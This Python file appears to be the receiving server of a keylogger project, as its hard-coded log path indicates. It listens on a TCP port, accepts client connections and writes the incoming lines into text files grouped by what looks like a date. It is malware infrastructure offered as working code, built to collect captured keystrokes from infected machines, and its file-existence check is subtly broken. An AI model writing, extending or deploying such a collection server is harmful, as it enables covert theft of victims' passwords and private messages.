import socket as sock
import os
import logging

from typing import List


class Server:
    def __init__(self, host: str = sock.gethostname(), port: int = 12345) -> None: 
        self._host: str = host
        self._port: int = port

        self._base_path: str = os.path.dirname(__file__)
        self._data_path: str = os.path.join(self._base_path, "data")

        # настройки логгера
        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\server\\server_logs.log"
        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')


    def run(self) -> None: 
        self.server: sock.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM, proto=0)

        try:
            self.server.bind((self._host, self._port))
            self.server.listen()

            while 1:
                self.conn, addr = self.server.accept()
                logging.info(f"[+] new connection with {addr}")
                
                with self.conn:
                    while 1:
                        try:
                            data: str = self.__get_data()  # получение данных от клиента
                            
                            if not data: 
                                break
                            data: List[str] = data.split("\n")
                            self.__save_data(data)  # сохранение данных в 
                        except Exception as err:
                            logging.warning(f"[!!] {addr} failed: {err}")
        except sock.error as err:
            logging.critical(f"run() server socket error: {err}")
        finally: 
            self.server.close()


    def __get_data(self) -> str: 
        try:
            buffer: bytes = self.conn.recv(1024)

            if not buffer: return

            data: str = buffer.decode()
        except sock.error as err:
            logging.warning(f"[!] __get_data() failed: {err}") 
        else:
            logging.info('[+] __get_data() completed!')
            return data


    def __save_data(self, lines: List[str]) -> None: 
        if not os.path.exists(self._data_path):
            os.makedirs(self._data_path)

        print(lines)
        for line in lines:
            files: List[str] = os.listdir(self._data_path)
            filepath = os.path.join(self._data_path, line[1:11]+".txt")
            print(files)
            print(filepath)
            try:
                mode: str = 'a' if filepath in files else 'w'
                
                with open(filepath, mode, encoding='utf-8') as file:
                    file.write(line)
            except FileNotFoundError as err:
                logging.warning(f"__save_data() file not found error: {err}")
            except Exception as err:
                logging.warning(f"__save_data() writing failed: {err}")
            else:
                logging.info(f"__save_data() completed!")
                print("[+] data pack was saved!\n")


def main() -> None:
    server: Server = Server()
    server.run()


if __name__ == '__main__':
    main()